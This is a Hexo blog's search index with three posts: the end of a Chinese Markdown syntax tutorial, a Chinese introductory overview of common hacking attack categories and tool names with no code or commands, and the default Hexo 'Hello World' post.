href="#1-无序列表：">🍭</a>(1)无序列表：</h3><p>在文字开头添加(*,+,-)实现无序列表。但是要注意在符号和文字之间需要添加空格。</p><p>嵌套:上一级和下一级之间需要三个空格或tab键</p><p><img src="/2020/10/09/markdown/%E5%B5%8C%E5%A5%97.jpg" alt="嵌套"></p><h3 id="2-有序列表"><a class="header-anchor" href="#2-有序列表">🍭</a>(2)有序列表:</h3><p>使用数字后面跟上句号,还要有空格。</p><p><img src="/2020/10/09/markdown/%E5%88%97%E8%A1%A8.jpg" alt="列表"></p><h2 id="4、链接"><a class="header-anchor" href="#4、链接">🍭</a>4、链接</h2><h3 id="1-直接设置（行内形式"><a class="header-anchor" href="#1-直接设置（行内形式">🍭</a>(1)直接设置（行内形式)</h3><p>语法：<a href="%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80" title="链接title">链接名</a></p><h3 id="2-间接设置（参考形式）"><a class="header-anchor" href="#2-间接设置（参考形式）">🍭</a>(2)间接设置（参考形式）</h3><p><strong>语法：[链接名称][标记]</strong><br>[标记]: 链接地址 “链接title”</p><h3 id="3）隐式设置"><a class="header-anchor" href="#3）隐式设置">🍭</a>(3）隐式设置</h3><p><strong>语法：[链接名称][]</strong><br>[链接名称]: 链接地址 “链接title”</p><h2 id="5、图片"><a class="header-anchor" href="#5、图片">🍭</a>5、图片</h2><p>直接复制一个图片路径到编辑器，然后前面加上感叹号！即可</p><h2 id="6、引用"><a class="header-anchor" href="#6、引用">🍭</a>6、引用</h2><p>（1）引用换行：末尾加两个空格。</p><p>(2）引用内包含其他语法：</p><p>**如：**标题、列表、代码块 <strong>一定要写在引开头处</strong></p><p><img src="/2020/10/09/markdown/%E5%BC%95.jpg" alt="引"></p><h2 id="7、水平分割线"><a class="header-anchor" href="#7、水平分割线">🍭</a>7、水平分割线</h2><p>用3个连续的*或_或-即可</p><h2 id="8、表格"><a class="header-anchor" href="#8、表格">🍭</a>8、表格</h2><p>关于冒号（:）</p><p>**左边：**以下内容左对齐</p><p>**右边：**以下内容右对齐</p><p>**两边：**以下内容居中对齐</p><p><img src="/2020/10/09/markdown/%E8%A1%A8%E6%A0%BC.jpg" alt="表格"></p><h2 id="9、代码"><a class="header-anchor" href="#9、代码">🍭</a>9、代码</h2><h3 id="1）代码句"><a class="header-anchor" href="#1）代码句">🍭</a>(1）代码句</h3><p>用反引号（`），就是英文状态下的波浪线。</p><h3 id="2）代码段"><a class="header-anchor" href="#2）代码段">🍭</a>(2）代码段</h3><p>4个空格（或Tab缩进）定义代码块。</p><h3 id="3）用三个以上的反引号定义段开始和结束"><a class="header-anchor" href="#3）用三个以上的反引号定义段开始和结束">🍭</a>(3）用三个以上的反引号定义段开始和结束</h3><h2 id="10、目录"><a class="header-anchor" href="#10、目录">🍭</a>10、目录</h2><p>在想加目录的地方输入[TOC]</p><h2 id="11、转义字符"><a class="header-anchor" href="#11、转义字符">🍭</a>11、转义字符</h2><p><img src="/2020/10/09/markdown/%E5%AD%97%E7%AC%A6.jpg" alt="字符"></p><h2 id="12、UML图"><a class="header-anchor" href="#12、UML图">🍭</a>12、UML图</h2><h3 id="渲染序列图："><a class="header-anchor" href="#渲染序列图：">🍭</a>渲染序列图：</h3><p><img src="/2020/10/09/markdown/%E5%93%88.jpg" alt="哈"></p><p>效果如下:</p><p><img src="/2020/10/09/markdown/%E5%95%A6.jpg" alt="啦"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cyber security tour</title>
    <link href="/2020/10/05/Cyber/"/>
    <url>/2020/10/05/Cyber/</url>
    
    <content type="html"><![CDATA[<p>黑客(Hacher）</p><p><img src="/2020/10/05/Cyber/%E9%BB%91%E5%AE%A2.jpg" alt="黑客"></p><p>源于英语动词 hack，意为“劈，砍”。黑客主要利用计算机系统或网络的漏洞，包括软件漏洞、硬件漏洞、网络协议漏洞、管理方面的漏洞喝一些人为的错误，通过现有的或自己开发的工具软件实施攻击。黑客攻击手段主要包括：<br>（1）探测攻击。通过少票允许连接的服务和开放的端口，能够迅速发现目标主机端口的分配情况以及提供的各项服务和服务程序的版本号，黑客找到有机可乘的服务或端口后进行攻击。常见的探测攻击程序有：SATAN、Saint、NTscan、Nessus等。<br>(2)网络监听。将网卡设置为混杂模式，对以太网上流通的所有数据包进行监听，并将符合一定条件的数据包记录到文件中去，以获取敏感信息。常见的网络监听工具有：NetRay、Sniffit、Sniffer、Etherfind、Snoop等。<br>（3)解码类攻击。通过各种方法获取 password文件，然后用口令猜测程序破译用户账号和密码。常见的工具有：Crack、LOphtCrack、John the Ripper等。<br>(4)未授权访问尝试。利用系统管理策略或配置文件的漏洞，获得比合法权限更高的操作权。如：NFS猜测、NFS UID检查等。<br>(5)缓冲区溢出。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程<br>序的堆栈，使程序转而执行其他的指令，如果这些指令是放在root 权限的内存中，那么一旦这些<br>指令得到了运行，黑客就以root 权限控制了系统，达到入侵的目的。缓冲区攻击的目的在于扰乱<br>某些以特权身份运行的程序的功能。使攻击者获得程序的控制权。<br>（6)伪装攻击，通过指定路由或伪造家地址，以假冒身份于其他主机进行合法通讯、或发送假<br>数据包，使受攻击主机出现错误动作。如IP欺骗。<br>(7)电子欺骗攻击。黑客利用TCP/TP协议本身的一些缺陷对TCP/IP网络进行攻击，主要方式<br>有：ARP欺骗、DNS欺骗、Web 欺骗、电子邮件欺骗等，</p><p>(8)WWW攻击。利用WEB的不合理配置，或CGI程序的漏洞进行攻击，达到获取脚本源码，非法<br>执行程序，使WWW服务器崩溃等目的。如：Windouws NT的IIS服务器的多种攻击。<br>(9)拒绝服务和分布式拒绝服务攻击。这种攻击行为通过发送一定数量一定序列的数据包，是<br>网络服务器中充斥了大量要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷以<br>至瘫痪、停止正常的网络服务。<br>（10)病毒攻击。病毒是黑客实施网络攻击的有效手段之一，它具有隐蔽性、寄生性、繁殖性和<br>破坏性，而且在网络中更加可怕。目前可通过网络进行传播的病毒已有数千中。<br>为了对这些影响网络安全的威胁进行有效防范，我们必须采用有效的技术手段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/10/04/hello-world/"/>
    <url>/2020/10/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a class="header-anchor" href="#Quick-Start">🍭</a>Quick Start</h2><h3 id="Create-a-new-post"><a class="header-anchor" href="#Create-a-new-post">🍭</a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a class="header-anchor" href="#Run-server">🍭</a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a class="header-anchor" href="#Generate-static-files">🍭</a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a class="header-anchor" href="#Deploy-to-remote-sites">🍭</a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
